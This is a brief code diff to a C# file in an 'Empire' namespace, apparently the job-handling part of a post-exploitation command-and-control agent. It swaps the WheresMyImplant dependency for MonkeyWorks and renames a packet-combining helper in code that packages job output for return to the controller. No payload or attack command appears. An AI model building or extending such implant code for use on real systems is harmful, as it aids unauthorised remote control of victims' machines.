@@ -5,7 +5,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Threading;
 
-using WheresMyImplant;
+using MonkeyWorks;
 
 namespace Empire
 {
@@ -31,7 +31,7 @@ namespace Empire
                     //Add to packet
                     jobs.Remove(job.Key);
                     //Add the correct result id
-                    packets = Misc.Combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
+                    packets = Combine.combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
                 }
             }
         }
@@ -56,7 +56,7 @@ namespace Empire
 
                 if (results.Length > 0)
                 {
-                    jobResults = Misc.Combine(jobResults, coms.encodePacket(110, results, 0));
+                    jobResults = Combine.combine(jobResults, coms.encodePacket(110, results, 0));
                 }
             }
             return jobResults;
